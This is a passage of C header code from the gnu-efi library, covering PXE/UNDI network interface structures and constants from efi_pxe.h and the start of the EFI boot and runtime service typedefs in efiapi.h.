#define PXE_ROMID_IMP_PROMISCUOUS_MULTICAST_RX_SUPPORTED    0x00000080
#define PXE_ROMID_IMP_PROMISCUOUS_RX_SUPPORTED      0x00000040
#define PXE_ROMID_IMP_BROADCAST_RX_SUPPORTED        0x00000020
#define PXE_ROMID_IMP_FILTERED_MULTICAST_RX_SUPPORTED   0x00000010
#define PXE_ROMID_IMP_SOFTWARE_INT_SUPPORTED        0x00000008
#define PXE_ROMID_IMP_TX_COMPLETE_INT_SUPPORTED     0x00000004
#define PXE_ROMID_IMP_PACKET_RX_INT_SUPPORTED       0x00000002
#define PXE_ROMID_IMP_CMD_COMPLETE_INT_SUPPORTED        0x00000001

 
typedef struct s_pxe_cdb {
PXE_OPCODE OpCode;
PXE_OPFLAGS OpFlags;
PXE_UINT16 CPBsize;
PXE_UINT16 DBsize;
UINT64 CPBaddr;
UINT64 DBaddr;
PXE_STATCODE StatCode;
PXE_STATFLAGS StatFlags;
PXE_UINT16 IFnum;
PXE_CONTROL Control;
} PXE_CDB;


typedef union u_pxe_ip_addr {
PXE_IPV6 IPv6;
PXE_IPV4 IPv4;
} PXE_IP_ADDR;

typedef union pxe_device {
//
// PCI and PC Card NICs are both identified using bus, device
// and function numbers.  For PC Card, this may require PC
// Card services to be loaded in the BIOS or preboot
// environment.
//
struct {
//
// See S/W UNDI ROMID structure definition for PCI and
// PCC BusType definitions.
//
PXE_UINT32 BusType;

//
// Bus, device & function numbers that locate this device.
//
PXE_UINT16 Bus;
PXE_UINT8 Device;
PXE_UINT8 Function;
} PCI, PCC;

//
// %%TBD - More information is needed about enumerating
// USB and 1394 devices.
//
struct {
PXE_UINT32 BusType;
PXE_UINT32 tdb;
} USB, _1394;
} PXE_DEVICE;

// cpb and db definitions

#define MAX_PCI_CONFIG_LEN 64   // # of dwords
#define MAX_EEPROM_LEN 128       // #of dwords
#define MAX_XMIT_BUFFERS    32  // recycling Q length for xmit_done
#define MAX_MCAST_ADDRESS_CNT 8

typedef struct s_pxe_cpb_start {
    //
    // PXE_VOID Delay(PXE_UINT64 microseconds);
    //
    // UNDI will never request a delay smaller than 10 microseconds
    // and will always request delays in increments of 10 microseconds.
    // The Delay() CallBack routine must delay between n and n + 10 
    // microseconds before returning control to the UNDI.
    //
    // This field cannot be set to zero.
    //
    PXE_UINT64 Delay;

    //
    // PXE_VOID Block(PXE_UINT32 enable);
    //
    // UNDI may need to block multi-threaded/multi-processor access to
    // critical code sections when programming or accessing the network
    // device.  To this end, a blocking service is needed by the UNDI.
    // When UNDI needs a block, it will call Block() passing a non-zero
    // value.  When UNDI no longer needs a block, it will call Block()
    // with a zero value.  When called, if the Block() is already enabled,
    // do not return control to the UNDI until the previous Block() is
    // disabled.
    //
    // This field cannot be set to zero.
    //
    PXE_UINT64 Block;

    //
    // PXE_VOID Virt2Phys(PXE_UINT64 virtual, PXE_UINT64 physical_ptr);
    //
    // UNDI will pass the virtual address of a buffer and the virtual
    // address of a 64-bit physical buffer.  Convert the virtual address
    // to a physical address and write the result to the physical address
    // buffer.  If virtual and physical addresses are the same, just
    // copy the virtual address to the physical address buffer.
    //
    // This field can be set to zero if virtual and physical addresses 
    // are equal.
    //
    PXE_UINT64 Virt2Phys;
    //
    // PXE_VOID Mem_IO(PXE_UINT8 read_write, PXE_UINT8 len, PXE_UINT64 port, 
    //              PXE_UINT64 buf_addr);
    //
    // UNDI will read or write the device io space using this call back 
    // function. It passes the number of bytes as the len parameter and it 
    // will be either 1,2,4 or 8.
    //
    // This field can not be set to zero.
    //
    PXE_UINT64 Mem_IO;
} PXE_CPB_START;

#define PXE_DELAY_MILLISECOND                   1000
#define PXE_DELAY_SECOND                    1000000
#define PXE_IO_READ                     0
#define PXE_IO_WRITE                        1
#define PXE_MEM_READ                        2
#define PXE_MEM_WRITE                       4


typedef struct s_pxe_db_get_init_info {
    //
    // Minimum length of locked memory buffer that must be given to
    // the Initialize command. Giving UNDI more memory will generally
    // give better performance.
    //
    // If MemoryRequired is zero, the UNDI does not need and will not
    // use system memory to receive and transmit packets.
    //
    PXE_UINT32 MemoryRequired;

    //
    // Maximum frame data length for Tx/Rx excluding the media header.
    //
    PXE_UINT32 FrameDataLen;

    //
    // Supported link speeds are in units of mega bits.  Common ethernet
    // values are 10, 100 and 1000.  Unused LinkSpeeds[] entries are zero
    // filled.
    //
    PXE_UINT32 LinkSpeeds[4];

    //
    // Number of non-volatile storage items.
    //
    PXE_UINT32 NvCount;

    //
    // Width of non-volatile storage item in bytes.  0, 1, 2 or 4
    //
    PXE_UINT16 NvWidth;

    //
    // Media header length.  This is the typical media header length for
    // this UNDI.  This information is needed when allocating receive
    // and transmit buffers.
    //
    PXE_UINT16 MediaHeaderLen;

    //
    // Number of bytes in the NIC hardware (MAC) address.
    //
    PXE_UINT16 HWaddrLen;

    //
    // Maximum number of multicast MAC addresses in the multicast
    // MAC address filter list.
    //
    PXE_UINT16 MCastFilterCnt;

    //
    // Default number and size of transmit and receive buffers that will 
    // be allocated by the UNDI.  If MemoryRequired is non-zero, this 
    // allocation will come out of the memory buffer given to the Initialize 
    // command.  If MemoryRequired is zero, this allocation will come out of 
    // memory on the NIC.
    //
    PXE_UINT16 TxBufCnt;
    PXE_UINT16 TxBufSize;
    PXE_UINT16 RxBufCnt;
    PXE_UINT16 RxBufSize;

    //
    // Hardware interface types defined in the Assigned Numbers RFC
    // and used in DHCP and ARP packets.
    // See the PXE_IFTYPE typedef and PXE_IFTYPE_xxx macros.
    //
    PXE_UINT8 IFtype;

    //
    // Supported duplex.  See PXE_DUPLEX_xxxxx #defines below.
    //
    PXE_UINT8 Duplex;

    //
    // Supported loopback options.  See PXE_LOOPBACK_xxxxx #defines below.
    //
    PXE_UINT8 LoopBack;
} PXE_DB_GET_INIT_INFO;

#define PXE_MAX_TXRX_UNIT_ETHER             1500

#define PXE_HWADDR_LEN_ETHER                    0x0006
#define PXE_MAC_HEADER_LEN_ETHER                0x000E

#define PXE_DUPLEX_ENABLE_FULL_SUPPORTED            1
#define PXE_DUPLEX_FORCE_FULL_SUPPORTED         2

#define PXE_LOOPBACK_INTERNAL_SUPPORTED         1
#define PXE_LOOPBACK_EXTERNAL_SUPPORTED         2


typedef struct s_pxe_pci_config_info {
    //
    // This is the flag field for the PXE_DB_GET_CONFIG_INFO union.
    // For PCI bus devices, this field is set to PXE_BUSTYPE_PCI.
    //
    PXE_UINT32 BusType;

    //
    // This identifies the PCI network device that this UNDI interface
    // is bound to.
    //
    PXE_UINT16 Bus;
    PXE_UINT8 Device;
    PXE_UINT8 Function;

    //
    // This is a copy of the PCI configuration space for this 
    // network device.
    //
    union {
        PXE_UINT8 Byte[256];
        PXE_UINT16 Word[128];
        PXE_UINT32 Dword[64];
    } Config;
} PXE_PCI_CONFIG_INFO;


typedef struct s_pxe_pcc_config_info {
    //
    // This is the flag field for the PXE_DB_GET_CONFIG_INFO union.
    // For PCC bus devices, this field is set to PXE_BUSTYPE_PCC.
    //
    PXE_UINT32 BusType;
    
    //
    // This identifies the PCC network device that this UNDI interface
    // is bound to.
    //
    PXE_UINT16 Bus;
    PXE_UINT8 Device;
    PXE_UINT8 Function;

    //
    // This is a copy of the PCC configuration space for this 
    // network device.
    //
    union {
        PXE_UINT8 Byte[256];
        PXE_UINT16 Word[128];
        PXE_UINT32 Dword[64];
    } Config;
} PXE_PCC_CONFIG_INFO;


typedef struct s_pxe_usb_config_info {
    PXE_UINT32 BusType;
    // %%TBD What should we return here...
} PXE_USB_CONFIG_INFO;


typedef struct s_pxe_1394_config_info {
    PXE_UINT32 BusType;
    // %%TBD What should we return here...
} PXE_1394_CONFIG_INFO;


typedef union u_pxe_db_get_config_info {
    PXE_PCI_CONFIG_INFO pci;
    PXE_PCC_CONFIG_INFO pcc;
    PXE_USB_CONFIG_INFO usb;
    PXE_1394_CONFIG_INFO _1394;
} PXE_DB_GET_CONFIG_INFO;


typedef struct s_pxe_cpb_initialize {
    //
    // Address of first (lowest) byte of the memory buffer.  This buffer must
    // be in contiguous physical memory and cannot be swapped out.  The UNDI
    // will be using this for transmit and receive buffering.
    //
    PXE_UINT64 MemoryAddr;

    //
    // MemoryLength must be greater than or equal to MemoryRequired
    // returned by the Get Init Info command.
    //
    PXE_UINT32 MemoryLength;

    //
    // Desired link speed in Mbit/sec.  Common ethernet values are 10, 100
    // and 1000.  Setting a value of zero will auto-detect and/or use the
    // default link speed (operation depends on UNDI/NIC functionality).
    //
    PXE_UINT32 LinkSpeed;

    //
    // Suggested number and size of receive and transmit buffers to
    // allocate.  If MemoryAddr and MemoryLength are non-zero, this
    // allocation comes out of the supplied memory buffer.  If MemoryAddr 
    // and MemoryLength are zero, this allocation comes out of memory
    // on the NIC.
    //
    // If these fields are set to zero, the UNDI will allocate buffer
    // counts and sizes as it sees fit.
    //
    PXE_UINT16 TxBufCnt;
    PXE_UINT16 TxBufSize;
    PXE_UINT16 RxBufCnt;
    PXE_UINT16 RxBufSize;

    //
    // The following configuration parameters are optional and must be zero 
    // to use the default values.
    //
    PXE_UINT8 Duplex; 

    PXE_UINT8 LoopBack;
} PXE_CPB_INITIALIZE;


#define PXE_DUPLEX_DEFAULT                  0x00
#define PXE_FORCE_FULL_DUPLEX                   0x01
#define PXE_ENABLE_FULL_DUPLEX              0x02

#define LOOPBACK_NORMAL 0
#define LOOPBACK_INTERNAL 1
#define LOOPBACK_EXTERNAL 2


typedef struct s_pxe_db_initialize {
    //
    // Actual amount of memory used from the supplied memory buffer.  This
    // may be less that the amount of memory suppllied and may be zero if
    // the UNDI and network device do not use external memory buffers.
    //
    // Memory used by the UNDI and network device is allocated from the 
    // lowest memory buffer address.
    //
    PXE_UINT32 MemoryUsed;

    //
    // Actual number and size of receive and transmit buffers that were
    // allocated.
    //
    PXE_UINT16 TxBufCnt;
    PXE_UINT16 TxBufSize;
    PXE_UINT16 RxBufCnt;
    PXE_UINT16 RxBufSize;
} PXE_DB_INITIALIZE;


typedef struct s_pxe_cpb_receive_filters {
    //
    // List of multicast MAC addresses.  This list, if present, will
    // replace the existing multicast MAC address filter list.
    //
    PXE_MAC_ADDR MCastList[MAX_MCAST_ADDRESS_CNT];
} PXE_CPB_RECEIVE_FILTERS;


typedef struct s_pxe_db_receive_filters {
    //
    // Filtered multicast MAC address list.
    //
    PXE_MAC_ADDR MCastList[MAX_MCAST_ADDRESS_CNT];
} PXE_DB_RECEIVE_FILTERS;


typedef struct s_pxe_cpb_station_address {
    //
    // If supplied and supported, the current station MAC address
    // will be changed.
    //
    PXE_MAC_ADDR StationAddr;
} PXE_CPB_STATION_ADDRESS;


typedef struct s_pxe_dpb_station_address {
    //
    // Current station MAC address.
    //
    PXE_MAC_ADDR StationAddr;

    //
    // Station broadcast MAC address.
    //
    PXE_MAC_ADDR BroadcastAddr;

    //
    // Permanent station MAC address.
    //
    PXE_MAC_ADDR PermanentAddr;
} PXE_DB_STATION_ADDRESS;


typedef struct s_pxe_db_statistics {
    //
    // Bit field identifying what statistic data is collected by the 
    // UNDI/NIC.
    // If bit 0x00 is set, Data[0x00] is collected.
    // If bit 0x01 is set, Data[0x01] is collected.
    // If bit 0x20 is set, Data[0x20] is collected.
    // If bit 0x21 is set, Data[0x21] is collected.
    // Etc.
    //
    PXE_UINT64 Supported;

    //
    // Statistic data.
    //
    PXE_UINT64 Data[64];
} PXE_DB_STATISTICS;

//
// Total number of frames received.  Includes frames with errors and
// dropped frames.
//
#define PXE_STATISTICS_RX_TOTAL_FRAMES          0x00

//
// Number of valid frames received and copied into receive buffers.
//
#define PXE_STATISTICS_RX_GOOD_FRAMES           0x01

//
// Number of frames below the minimum length for the media.
// This would be <64 for ethernet.
//
#define PXE_STATISTICS_RX_UNDERSIZE_FRAMES          0x02

//
// Number of frames longer than the maxminum length for the
// media.  This would be >1500 for ethernet.
//
#define PXE_STATISTICS_RX_OVERSIZE_FRAMES           0x03

//
// Valid frames that were dropped because receive buffers were full.
//
#define PXE_STATISTICS_RX_DROPPED_FRAMES            0x04

//
// Number of valid unicast frames received and not dropped.
//
#define PXE_STATISTICS_RX_UNICAST_FRAMES            0x05

//
// Number of valid broadcast frames received and not dropped.
//
#define PXE_STATISTICS_RX_BROADCAST_FRAMES          0x06

//
// Number of valid mutlicast frames received and not dropped.
//
#define PXE_STATISTICS_RX_MULTICAST_FRAMES          0x07

//
// Number of frames w/ CRC or alignment errors.
//
#define PXE_STATISTICS_RX_CRC_ERROR_FRAMES          0x08

//
// Total number of bytes received.  Includes frames with errors
// and dropped frames.
//
#define PXE_STATISTICS_RX_TOTAL_BYTES           0x09

//
// Transmit statistics.
//
#define PXE_STATISTICS_TX_TOTAL_FRAMES          0x0A
#define PXE_STATISTICS_TX_GOOD_FRAMES           0x0B
#define PXE_STATISTICS_TX_UNDERSIZE_FRAMES          0x0C
#define PXE_STATISTICS_TX_OVERSIZE_FRAMES           0x0D
#define PXE_STATISTICS_TX_DROPPED_FRAMES            0x0E
#define PXE_STATISTICS_TX_UNICAST_FRAMES            0x0F
#define PXE_STATISTICS_TX_BROADCAST_FRAMES          0x10
#define PXE_STATISTICS_TX_MULTICAST_FRAMES          0x11
#define PXE_STATISTICS_TX_CRC_ERROR_FRAMES          0x12
#define PXE_STATISTICS_TX_TOTAL_BYTES           0x13

//
// Number of collisions detection on this subnet.
//
#define PXE_STATISTICS_COLLISIONS               0x14

//
// Number of frames destined for unsupported protocol.
//
#define PXE_STATISTICS_UNSUPPORTED_PROTOCOL         0x15


typedef struct s_pxe_cpb_mcast_ip_to_mac {
    //
    // Multicast IP address to be converted to multicast MAC address.
    //
    PXE_IP_ADDR IP;
} PXE_CPB_MCAST_IP_TO_MAC;


typedef struct s_pxe_db_mcast_ip_to_mac {
    //
    // Multicast MAC address.
    //
    PXE_MAC_ADDR MAC;
} PXE_DB_MCAST_IP_TO_MAC;


typedef struct s_pxe_cpb_nvdata_sparse {
    //
    // NvData item list.  Only items in this list will be updated.
    //
    struct {
        //  Non-volatile storage address to be changed.
        PXE_UINT32 Addr;

        // Data item to write into above storage address.
    
        union {
            PXE_UINT8 Byte;
            PXE_UINT16 Word;
            PXE_UINT32 Dword;
        } Data;
    } Item[MAX_EEPROM_LEN];
} PXE_CPB_NVDATA_SPARSE;


//
// When using bulk update, the size of the CPB structure must be
// the same size as the non-volatile NIC storage.
//
typedef union u_pxe_cpb_nvdata_bulk {
    //
    // Array of byte-wide data items.
    //
    PXE_UINT8 Byte[MAX_EEPROM_LEN << 2];

    //
    // Array of word-wide data items.
    //
    PXE_UINT16 Word[MAX_EEPROM_LEN << 1];

    //
    // Array of dword-wide data items.
    //
    PXE_UINT32 Dword[MAX_EEPROM_LEN];
} PXE_CPB_NVDATA_BULK;

typedef struct s_pxe_db_nvdata {

    // Arrays of data items from non-volatile storage.

    union {
        //
        // Array of byte-wide data items.
        //
        PXE_UINT8 Byte[MAX_EEPROM_LEN << 2];

        //
        // Array of word-wide data items.
        //
        PXE_UINT16 Word[MAX_EEPROM_LEN << 1];

        // Array of dword-wide data items.

        PXE_UINT32 Dword[MAX_EEPROM_LEN];
    } Data;
} PXE_DB_NVDATA;


typedef struct s_pxe_db_get_status {
    //
    // Length of next receive frame (header + data).  If this is zero,
    // there is no next receive frame available.
    //
    PXE_UINT32 RxFrameLen;

    //
    // Reserved, set to zero.
    //
    PXE_UINT32 reserved;

    //
    //  Addresses of transmitted buffers that need to be recycled.
    //
    PXE_UINT64 TxBuffer[MAX_XMIT_BUFFERS];
} PXE_DB_GET_STATUS;



typedef struct s_pxe_cpb_fill_header {
    //
    // Source and destination MAC addresses.  These will be copied into
    // the media header without doing byte swapping.
    //
    PXE_MAC_ADDR SrcAddr;
    PXE_MAC_ADDR DestAddr;

    //
    // Address of first byte of media header.  The first byte of packet data
    // follows the last byte of the media header.
    //
    PXE_UINT64 MediaHeader;

    //
    // Length of packet data in bytes (not including the media header).
    //
    PXE_UINT32 PacketLen;

    //
    // Protocol type.  This will be copied into the media header without
    // doing byte swapping.  Protocol type numbers can be obtained from
    // the Assigned Numbers RFC 1700.
    //
    PXE_UINT16 Protocol;

    //
    // Length of the media header in bytes.
    //
    PXE_UINT16 MediaHeaderLen;
} PXE_CPB_FILL_HEADER;


#define PXE_PROTOCOL_ETHERNET_IP                0x0800
#define PXE_PROTOCOL_ETHERNET_ARP               0x0806
#define MAX_XMIT_FRAGMENTS 16

typedef struct s_pxe_cpb_fill_header_fragmented {
    //
    // Source and destination MAC addresses.  These will be copied into
    // the media header without doing byte swapping.
    //
    PXE_MAC_ADDR SrcAddr;
    PXE_MAC_ADDR DestAddr;

    //
    // Length of packet data in bytes (not including the media header).
    //
    PXE_UINT32 PacketLen;

    //
    // Protocol type.  This will be copied into the media header without
    // doing byte swapping.  Protocol type numbers can be obtained from
    // the Assigned Numbers RFC 1700.
    //
    PXE_MEDIA_PROTOCOL Protocol;

    //
    // Length of the media header in bytes.
    //
    PXE_UINT16 MediaHeaderLen;

    //
    // Number of packet fragment descriptors.
    //
    PXE_UINT16 FragCnt;

    //
    // Reserved, must be set to zero.
    //
    PXE_UINT16 reserved;

    //
    // Array of packet fragment descriptors.  The first byte of the media
    // header is the first byte of the first fragment.
    //
    struct {
        //
        // Address of this packet fragment.
        //
        PXE_UINT64 FragAddr;

        //
        // Length of this packet fragment.
        //
        PXE_UINT32 FragLen;

        //
        // Reserved, must be set to zero.
        //
        PXE_UINT32 reserved;
    } FragDesc[MAX_XMIT_FRAGMENTS];
} PXE_CPB_FILL_HEADER_FRAGMENTED;



typedef struct s_pxe_cpb_transmit {
    //
    // Address of first byte of frame buffer.  This is also the first byte
    // of the media header.
    //
    PXE_UINT64 FrameAddr;

    //
    // Length of the data portion of the frame buffer in bytes.  Do not
    // include the length of the media header.
    //
    PXE_UINT32 DataLen;

    //
    // Length of the media header in bytes.
    //
    PXE_UINT16 MediaheaderLen;

    //
    // Reserved, must be zero.
    //
    PXE_UINT16 reserved;
} PXE_CPB_TRANSMIT;



typedef struct s_pxe_cpb_transmit_fragments {
    //
    // Length of packet data in bytes (not including the media header).
    //
    PXE_UINT32 FrameLen;

    //
    // Length of the media header in bytes.
    //
    PXE_UINT16 MediaheaderLen;

    //
    // Number of packet fragment descriptors.
    //
    PXE_UINT16 FragCnt;

    //
    // Array of frame fragment descriptors.  The first byte of the first
    // fragment is also the first byte of the media header.
    //
    struct {
        //
        // Address of this frame fragment.
        //
        PXE_UINT64 FragAddr;

        //
        // Length of this frame fragment.
        //
        PXE_UINT32 FragLen;

        //
        // Reserved, must be set to zero.
        //
        PXE_UINT32 reserved;
    } FragDesc[MAX_XMIT_FRAGMENTS];
} PXE_CPB_TRANSMIT_FRAGMENTS;


typedef struct s_pxe_cpb_receive {
    //
    // Address of first byte of receive buffer.  This is also the first byte
    // of the frame header.
    //
    PXE_UINT64 BufferAddr;

    //
    // Length of receive buffer.  This must be large enough to hold the
    // received frame (media header + data).  If the length of smaller than
    // the received frame, data will be lost.
    //
    PXE_UINT32 BufferLen;

    //
    // Reserved, must be set to zero.
    //
    PXE_UINT32 reserved;
} PXE_CPB_RECEIVE;


typedef struct s_pxe_db_receive {
    //
    // Source and destination MAC addresses from media header.
    //
    PXE_MAC_ADDR SrcAddr;
    PXE_MAC_ADDR DestAddr;

    //
    // Length of received frame.  May be larger than receive buffer size.
    // The receive buffer will not be overwritten.  This is how to tell
    // if data was lost because the receive buffer was too small.
    //
    PXE_UINT32 FrameLen;

    //
    // Protocol type from media header.
    //
    PXE_MEDIA_PROTOCOL Protocol;

    //
    // Length of media header in received frame.
    //
    PXE_UINT16 MediaHeaderLen;

    //
    // Type of receive frame.
    //
    PXE_FRAME_TYPE Type;

    //
    // Reserved, must be zero.
    //
    PXE_UINT8 reserved[7];

} PXE_DB_RECEIVE;

#pragma pack()

/* EOF - efi_pxe.h */
#endif /* _EFI_PXE_H */


```

`include/gnu-efi/efiapi.h`:

```h
#ifndef _EFI_API_H
#define _EFI_API_H

/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efiapi.h

Abstract:

    Global EFI runtime & boot service interfaces




Revision History

--*/

//
// EFI Specification Revision
//

#define EFI_SPECIFICATION_MAJOR_REVISION 1
#define EFI_SPECIFICATION_MINOR_REVISION 02

//
// Declare forward referenced data structures
//

INTERFACE_DECL(_EFI_SYSTEM_TABLE);

//
// EFI Memory
//

typedef
EFI_STATUS
(EFIAPI *EFI_ALLOCATE_PAGES) (
    IN EFI_ALLOCATE_TYPE            Type,
    IN EFI_MEMORY_TYPE              MemoryType,
    IN UINTN                        NoPages,
    OUT EFI_PHYSICAL_ADDRESS        *Memory
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FREE_PAGES) (
    IN EFI_PHYSICAL_ADDRESS         Memory,
    IN UINTN                        NoPages
    );

typedef
EFI_STATUS
(EFIAPI *EFI_GET_MEMORY_MAP) (
    IN OUT UINTN                    *MemoryMapSize,
    IN OUT EFI_MEMORY_DESCRIPTOR    *MemoryMap,
    OUT UINTN                       *MapKey,
    OUT UINTN                       *DescriptorSize,
    OUT UINT32                      *DescriptorVersion
    );

#define NextMemoryDescriptor(Ptr,Size)  ((EFI_MEMORY_DESCRIPTOR *) (((UINT8 *) Ptr) + Size))


typedef
EFI_STATUS
(EFIAPI *EFI_ALLOCATE_POOL) (
    IN EFI_MEMORY_TYPE              PoolType,
    IN UINTN                        Size,
    OUT VOID                        **Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_FREE_POOL) (
    IN VOID                         *Buffer
    );

typedef 
EFI_STATUS
(EFIAPI *EFI_SET_VIRTUAL_ADDRESS_MAP) (
    IN UINTN                        MemoryMapSize,
    IN UINTN                        DescriptorSize,
    IN UINT32                       DescriptorVersion,
    IN EFI_MEMORY_DESCRIPTOR        *VirtualMap
    );


#define EFI_OPTIONAL_PTR            0x00000001
#define EFI_INTERNAL_FNC            0x00000002      // Pointer to internal runtime fnc
#define EFI_INTERNAL_PTR            0x00000004      // Pointer to internal runtime data


typedef 
EFI_STATUS
(EFIAPI *EFI_CONVERT_POINTER) (
    IN UINTN                        DebugDisposition,
    IN OUT VOID                     **Address
    );


//
// EFI Events
//

#define EVT_TIMER                           0x80000000
#define EVT_RUNTIME                         0x40000000
#define EVT_RUNTIME_CONTEXT                 0x20000000

#define EVT_NOTIFY_WAIT                     0x00000100
#define EVT_NOTIFY_SIGNAL                   0x00000200

#define EVT_SIGNAL_EXIT_BOOT_SERVICES       0x00000201
#define EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE   0x60000202

#define EVT_EFI_SIGNAL_MASK                 0x000000FF
#define EVT_EFI_SIGNAL_MAX                  4

#define EFI_EVENT_TIMER                         EVT_TIMER
#define EFI_EVENT_RUNTIME                       EVT_RUNTIME
#define EFI_EVENT_RUNTIME_CONTEXT               EVT_RUNTIME_CONTEXT
#define EFI_EVENT_NOTIFY_WAIT                   EVT_NOTIFY_WAIT
#define EFI_EVENT_NOTIFY_SIGNAL                 EVT_NOTIFY_SIGNAL
#define EFI_EVENT_SIGNAL_EXIT_BOOT_SERVICES     EVT_SIGNAL_EXIT_BOOT_SERVICES
#define EFI_EVENT_SIGNAL_VIRTUAL_ADDRESS_CHANGE EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE
#define EFI_EVENT_EFI_SIGNAL_MASK               EVT_EFI_SIGNAL_MASK
#define EFI_EVENT_EFI_SIGNAL_MAX                EVT_EFI_SIGNAL_MAX


typedef
VOID
(EFIAPI *EFI_EVENT_NOTIFY) (
    IN EFI_EVENT                Event,
    IN VOID                     *Context
    );

typedef
EFI_STATUS
(EFIAPI *EFI_CREATE_EVENT) (
    IN UINT32                       Type,
    IN EFI_TPL                      NotifyTpl,
    IN EFI_EVENT_NOTIFY             NotifyFunction,
    IN VOID                         *NotifyContext,
    OUT EFI_EVENT                   *Event
    );

typedef enum {
    TimerCancel,
    TimerPeriodic,
    TimerRelative,
    TimerTypeMax
} EFI_TIMER_DELAY;

typedef
EFI_STATUS
(EFIAPI *EFI_SET_TIMER) (
    IN EFI_EVENT                Event,
    IN EFI_TIMER_DELAY          Type,
    IN UINT64                   TriggerTime
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SIGNAL_EVENT) (
    IN EFI_EVENT                Event
    );

typedef 
EFI_STATUS
(EFIAPI *EFI_WAIT_FOR_EVENT) (
    IN UINTN                    NumberOfEvents,
    IN EFI_EVENT                *Event,
    OUT UINTN                   *Index
    );

typedef
EFI_STATUS
(EFIAPI *EFI_CLOSE_EVENT) (
    IN EFI_EVENT                Event
    );

typedef
EFI_STATUS
(EFIAPI *EFI_CHECK_EVENT) (
    IN EFI_EVENT                Event
    );

//
// Task priority level
//

#define TPL_APPLICATION       4
#define TPL_CALLBACK          8
#define TPL_NOTIFY           16
#define TPL_HIGH_LEVEL       31
#define EFI_TPL_APPLICATION  TPL_APPLICATION
#define EFI_TPL_CALLBACK     TPL_CALLBACK
#define EFI_TPL_NOTIFY       TPL_NOTIFY
#define EFI_TPL_HIGH_LEVEL   TPL_HIGH_LEVEL
typedef
EFI_TPL
(EFIAPI *EFI_RAISE_TPL) (
    IN EFI_TPL      NewTpl
    );

typedef
VOID
(EFIAPI *EFI_RESTORE_TPL) (
    IN EFI_TPL      OldTpl
    );


//
// EFI platform varibles
//

#define EFI_GLOBAL_VARIABLE     \
    { 0x8BE4DF61, 0x93CA, 0x11d2, {0xAA, 0x0D, 0x00, 0xE0, 0x98, 0x03, 0x2B, 0x8C} }

// Variable attributes
#define EFI_VARIABLE_NON_VOLATILE                          0x00000001
#define EFI_VARIABLE_BOOTSERVICE_ACCESS                    0x00000002
#define EFI_VARIABLE_RUNTIME_ACCESS                        0x00000004
#define EFI_VARIABLE_HARDWARE_ERROR_RECORD                 0x00000008
#define EFI_VARIABLE_AUTHENTICATED_WRITE_ACCESS            0x00000010
#define EFI_VARIABLE_TIME_BASED_AUTHENTICATED_WRITE_ACCESS 0x00000020
#define EFI_VARIABLE_APPEND_WRITE                          0x00000040

// Variable size limitation
#define EFI_MAXIMUM_VARIABLE_SIZE           1024

typedef
EFI_STATUS
(EFIAPI *EFI_GET_VARIABLE) (
    IN CHAR16                       *VariableName,
    IN EFI_GUID                     *VendorGuid,
    OUT UINT32                      *Attributes OPTIONAL,
    IN OUT UINTN                    *DataSize,
    OUT VOID                        *Data
    );

typedef
EFI_STATUS
(EFIAPI *EFI_GET_NEXT_VARIABLE_NAME) (
    IN OUT UINTN                    *VariableNameSize,
    IN OUT CHAR16                   *VariableName,
    IN OUT EFI_GUID                 *VendorGuid
    );


typedef
EFI_STATUS
(EFIAPI *EFI_SET_VARIABLE) (
    IN CHAR16                       *VariableName,
    IN EFI_GUID                     *VendorGuid,
    IN UINT32                       Attributes,
    IN UINTN                        DataSize,
    IN VOID                         *Data
    );


//
// EFI Time
//

typedef struct {
        UINT32                      Resolution;     // 1e-6 parts per million
        UINT32                      Accuracy;       // hertz
        BOOLEAN                     SetsToZero;     // Set clears sub-second time
} EFI_TIME_CAPABILITIES;


typedef
EFI_STATUS
(EFIAPI *EFI_GET_TIME) (
    OUT EFI_TIME                    *Time,
    OUT EFI_TIME_CAPABILITIES       *Capabilities OPTIONAL
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SET_TIME) (
    IN EFI_TIME                     *Time
    );

typedef
EFI_STATUS
(EFIAPI *EFI_GET_WAKEUP_TIME) (
    OUT BOOLEAN                     *Enabled,
    OUT BOOLEAN                     *Pending,
    OUT EFI_TIME                    *Time
    );

typedef
EFI_STATUS
(EFIAPI *EFI_SET_WAKEUP_TIME) (
    IN BOOLEAN                      Enable,
    IN EFI_TIME                     *Time OPTIONAL
    );


//
// Image functions
//


// PE32+ Subsystem type for EFI images

#if !defined(IMAGE_SUBSYSTEM_EFI_APPLICATION)
#define IMAGE_SUBSYSTEM_EFI_APPLICATION             10
#define IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER     11
#define IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER          12
#endif

// PE32+ Machine type for EFI images

#if !defined(EFI_IMAGE_MACHINE_IA32)
#define EFI_IMAGE_MACHINE_IA32      0x014c
#endif

#if !defined(EFI_IMAGE_MACHINE_IA64)
#define EFI_IMAGE_MACHINE_IA64      0x0200
#endif

#if !defined(EFI_IMAGE_MACHINE_EBC)
#define EFI_IMAGE_MACHINE_EBC      0x0EBC
#endif

#if !defined(EFI_IMAGE_MACHINE_X64)
#define EFI_IMAGE_MACHINE_X64       0x8664
#endif

#if !defined(EFI_IMAGE_MACHINE_ARMTHUMB_MIXED)
#define EFI_IMAGE_MACHINE_ARMTHUMB_MIXED 0x01C2
#endif

#if !defined(EFI_IMAGE_MACHINE_AARCH64)
#define EFI_IMAGE_MACHINE_AARCH64   0xAA64
#endif

#if !defined(EFI_IMAGE_MACHINE_RISCV32)
#define EFI_IMAGE_MACHINE_RISCV32   0x5032
#endif

#if !defined(EFI_IMAGE_MACHINE_RISCV64)
#define EFI_IMAGE_MACHINE_RISCV64   0x5064
#endif

#if !defined(EFI_IMAGE_MACHINE_RISCV128)
#define EFI_IMAGE_MACHINE_RISCV128  0x5128
#endif

// Image Entry prototype

typedef 
EFI_STATUS
(EFIAPI *EFI_IMAGE_ENTRY_POINT) (
    IN EFI_HANDLE                   ImageHandle,
    IN struct _EFI_SYSTEM_TABLE     *SystemTable
    );

typedef 
EFI_STATUS
(EFIAPI *EFI_IMAGE_LOAD) (
    IN BOOLEAN                      BootPolicy,
    IN EFI_HANDLE                   ParentImageHandle,
    IN EFI_DEVICE_PATH              *FilePath,
    IN VOID                         *SourceBuffer   OPTIONAL,
    IN UINTN                        SourceSize,
    OUT EFI_HANDLE                  *ImageHandle
    );

typedef 
EFI_STATUS
